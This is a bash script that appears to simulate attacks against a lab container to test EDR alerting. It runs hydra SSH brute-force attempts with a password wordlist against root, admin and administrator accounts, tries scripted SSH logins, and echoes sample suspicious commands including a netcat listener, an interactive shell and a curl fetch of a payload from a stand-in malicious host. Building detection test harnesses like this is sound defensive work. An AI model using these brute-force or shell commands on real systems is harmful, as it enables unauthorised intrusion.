#!/bin/bash

echo "🔥 Starting Attack Simulation..."

TARGET_HOST=${TARGET_HOST:-agent}
TARGET_PORT=${TARGET_PORT:-22}

echo "Target: $TARGET_HOST:$TARGET_PORT"

# Wait for target to be ready
echo "⏳ Waiting for target to be ready..."
while ! nc -z $TARGET_HOST $TARGET_PORT; do
  sleep 1
done
echo "✅ Target is ready!"

# SSH Brute Force Attack
echo "🚨 Performing SSH Brute Force Attack..."
hydra -l root -P /usr/share/wordlists/passwords.txt -t 4 ssh://$TARGET_HOST:$TARGET_PORT -f || true
hydra -l admin -P /usr/share/wordlists/passwords.txt -t 4 ssh://$TARGET_HOST:$TARGET_PORT -f || true
hydra -l administrator -P /usr/share/wordlists/passwords.txt -t 4 ssh://$TARGET_HOST:$TARGET_PORT -f || true

# Failed SSH login attempts
echo "🚨 Performing Manual SSH Login Attempts..."
for user in root admin administrator test; do
  echo "Trying user: $user"
  timeout 5 ssh -o ConnectTimeout=3 -o PasswordAuthentication=yes $user@$TARGET_HOST -p $TARGET_PORT echo "success" || true
  sleep 2
done

# Suspicious command simulation (if we had access)
echo "🚨 Simulating Suspicious Commands..."
echo "These would run if we had access:"
echo "  - nc -l -p 4444"
echo "  - /bin/bash -i"
echo "  - python -c 'import socket...'"
echo "  - curl http://malicious.com/payload.sh"
echo "  - base64 -d <<< 'malicious_payload'"

echo "🔥 Attack simulation completed!"
echo "Check EDR Server for alerts: http://localhost:8080/api/v2/alerts"

# Keep container running
tail -f /dev/null

